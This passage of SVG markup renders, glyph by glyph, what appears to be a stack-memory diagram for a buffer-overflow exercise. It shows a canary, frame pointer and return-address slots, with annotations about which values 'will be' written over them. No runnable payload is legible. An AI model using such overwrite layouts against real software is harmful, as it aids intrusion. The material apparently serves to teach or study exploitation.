style="font-size:1em">0</text><text text-anchor="middle" x="168" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="168" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="168" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="168" y="452" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="168" y="692" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="176" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="176" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="176" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="176" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="176" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="176" y="548" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="176" y="596" fill="currentcolor" style="font-size:1em">F</text><text text-anchor="middle" x="176" y="644" fill="currentcolor" style="font-size:1em">R</text><text text-anchor="middle" x="176" y="692" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="184" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="184" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="184" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="184" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="184" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="184" y="548" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="184" y="596" fill="currentcolor" style="font-size:1em">P</text><text text-anchor="middle" x="184" y="644" fill="currentcolor" style="font-size:1em">A</text><text text-anchor="middle" x="184" y="692" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="192" y="68" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="192" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="192" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="192" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="192" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="192" y="548" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="200" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="200" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="200" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="200" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="200" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="200" y="548" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="200" y="692" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="208" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="208" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="208" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="208" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="208" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="208" y="548" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="208" y="692" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="216" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="216" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="216" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="216" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="216" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="216" y="548" fill="currentcolor" style="font-size:1em">y</text><text text-anchor="middle" x="216" y="692" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="224" y="68" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="224" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="224" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="224" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="224" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="224" y="692" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="232" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="232" y="116" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="232" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="232" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="232" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="232" y="692" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="240" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="240" y="116" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="240" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="240" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="240" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="248" y="68" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="248" y="116" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="248" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="248" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="248" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="256" y="68" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="256" y="116" fill="currentcolor" style="font-size:1em">7</text><text text-anchor="middle" x="256" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="256" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="256" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="264" y="68" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="264" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="264" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="264" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="264" y="308" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="296" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="296" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="296" y="404" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="296" y="500" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="296" y="548" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="296" y="596" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="296" y="644" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="296" y="692" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="296" y="708" fill="currentcolor" style="font-size:1em">W</text><text text-anchor="middle" x="304" y="308" fill="currentcolor" style="font-size:1em">+</text><text text-anchor="middle" x="304" y="356" fill="currentcolor" style="font-size:1em">+</text><text text-anchor="middle" x="304" y="404" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="304" y="500" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="304" y="548" fill="currentcolor" style="font-size:1em">*</text><text text-anchor="middle" x="304" y="596" fill="currentcolor" style="font-size:1em">*</text><text text-anchor="middle" x="304" y="644" fill="currentcolor" style="font-size:1em">*</text><text text-anchor="middle" x="304" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="304" y="708" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="312" y="308" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="312" y="356" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="312" y="404" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="312" y="500" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="312" y="548" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="312" y="596" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="312" y="644" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="312" y="692" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="320" y="356" fill="currentcolor" style="font-size:1em">-</text><text text-anchor="middle" x="320" y="404" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="320" y="500" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="320" y="596" fill="currentcolor" style="font-size:1em">*</text><text text-anchor="middle" x="320" y="644" fill="currentcolor" style="font-size:1em">*</text><text text-anchor="middle" x="320" y="692" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="320" y="708" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="328" y="356" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="328" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="328" y="500" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="328" y="548" fill="currentcolor" style="font-size:1em">=</text><text text-anchor="middle" x="328" y="596" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="328" y="644" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="328" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="328" y="708" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="336" y="404" fill="currentcolor" style="font-size:1em">+</text><text text-anchor="middle" x="336" y="500" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="336" y="548" fill="currentcolor" style="font-size:1em">></text><text text-anchor="middle" x="336" y="644" fill="currentcolor" style="font-size:1em">+</text><text text-anchor="middle" x="336" y="692" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="336" y="708" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="344" y="404" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="344" y="500" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="344" y="596" fill="currentcolor" style="font-size:1em">=</text><text text-anchor="middle" x="344" y="644" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="344" y="692" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="344" y="708" fill="currentcolor" style="font-size:1em">'</text><text text-anchor="middle" x="352" y="404" fill="currentcolor" style="font-size:1em">-</text><text text-anchor="middle" x="352" y="500" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="352" y="548" fill="currentcolor" style="font-size:1em">W</text><text text-anchor="middle" x="352" y="596" fill="currentcolor" style="font-size:1em">></text><text text-anchor="middle" x="352" y="644" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="352" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="352" y="708" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="360" y="404" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="360" y="500" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="360" y="548" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="360" y="644" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="360" y="692" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="368" y="404" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="368" y="500" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="368" y="548" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="368" y="596" fill="currentcolor" style="font-size:1em">W</text><text text-anchor="middle" x="368" y="644" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="368" y="692" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="368" y="708" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="376" y="500" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="376" y="548" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="376" y="596" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="376" y="644" fill="currentcolor" style="font-size:1em">7</text><text text-anchor="middle" x="376" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="376" y="708" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="384" y="500" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="384" y="596" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="384" y="644" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="384" y="692" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="384" y="708" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="392" y="132" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="392" y="500" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="392" y="548" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="392" y="596" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="392" y="644" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="392" y="692" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="392" y="708" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="400" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="400" y="164" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="400" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="400" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="400" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="400" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="400" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="400" y="500" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="400" y="548" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="400" y="644" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="400" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="408" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="408" y="164" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="408" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="408" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="408" y="308" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="408" y="356" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="408" y="404" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="408" y="500" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="408" y="548" fill="currentcolor" style="font-size:1em">:</text><text text-anchor="middle" x="408" y="596" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="408" y="644" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="408" y="692" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="408" y="708" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="416" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="416" y="164" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="416" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="416" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="416" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="416" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="416" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="416" y="500" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="416" y="596" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="416" y="644" fill="currentcolor" style="font-size:1em">5</text><text text-anchor="middle" x="416" y="692" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="416" y="708" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="424" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="424" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="424" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="424" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="424" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="424" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="424" y="500" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="424" y="548" fill="currentcolor" style="font-size:1em">N</text><text text-anchor="middle" x="424" y="596" fill="currentcolor" style="font-size:1em">:</text><text text-anchor="middle" x="424" y="644" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="424" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="424" y="708" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="432" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="432" y="500" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="432" y="548" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="432" y="644" fill="currentcolor" style="font-size:1em">7</text><text text-anchor="middle" x="432" y="692" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="432" y="708" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="440" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="440" y="500" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="440" y="548" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="440" y="596" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="440" y="644" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="440" y="692" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="440" y="708" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="448" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="448" y="500" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="448" y="596" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="448" y="644" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="448" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="456" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="456" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="456" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="456" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="456" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="456" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="456" y="500" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="456" y="548" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="456" y="596" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="456" y="644" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="456" y="692" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="456" y="708" fill="currentcolor" style="font-size:1em">w</text><text text-anchor="middle" x="464" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="464" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="464" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="464" y="308" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="464" y="356" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="464" y="404" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="464" y="500" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="464" y="548" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="464" y="596" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="464" y="644" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="464" y="692" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="464" y="708" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="472" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="472" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="472" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="472" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="472" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="472" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="472" y="500" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="472" y="548" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="472" y="596" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="472" y="644" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="472" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="472" y="708" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="480" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="480" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="480" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="480" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="480" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="480" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="480" y="500" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="480" y="548" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="480" y="596" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="480" y="644" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="480" y="692" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="480" y="708" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="488" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="488" y="500" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="488" y="548" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="488" y="596" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="488" y="644" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="488" y="692" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="496" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="496" y="500" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="496" y="548" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="496" y="596" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="496" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="496" y="708" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="504" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="504" y="500" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="504" y="548" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="504" y="644" fill="currentcolor" style="font-size:1em">=</text><text text-anchor="middle" x="504" y="692" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="504" y="708" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="512" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="512" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="512" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="512" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="512" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="512" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="512" y="500" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="512" y="548" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="512" y="596" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="512" y="644" fill="currentcolor" style="font-size:1em">></text><text text-anchor="middle" x="512" y="692" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="520" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="520" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="520" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="520" y="308" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="520" y="356" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="520" y="404" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="520" y="500" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="520" y="596" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="520" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="520" y="708" fill="currentcolor" style="font-size:1em">w</text><text text-anchor="middle" x="528" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="528" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="528" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="528" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="528" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="528" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="528" y="500" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="528" y="548" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="528" y="596" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="528" y="644" fill="currentcolor" style="font-size:1em">W</text><text text-anchor="middle" x="528" y="692" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="528" y="708" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="536" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="536" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="536" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="536" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="536" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="536" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="536" y="500" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="536" y="548" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="536" y="596" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="536" y="644" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="536" y="692" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="536" y="708" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="544" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="544" y="500" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="544" y="548" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="544" y="596" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="544" y="644" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="544" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="544" y="708" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="552" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="552" y="500" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="552" y="548" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="552" y="596" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="552" y="644" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="552" y="692" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="552" y="708" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="560" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="560" y="500" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="560" y="548" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="560" y="692" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="560" y="708" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="568" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="568" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="568" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="568" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="568" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="568" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="568" y="500" fill="currentcolor" 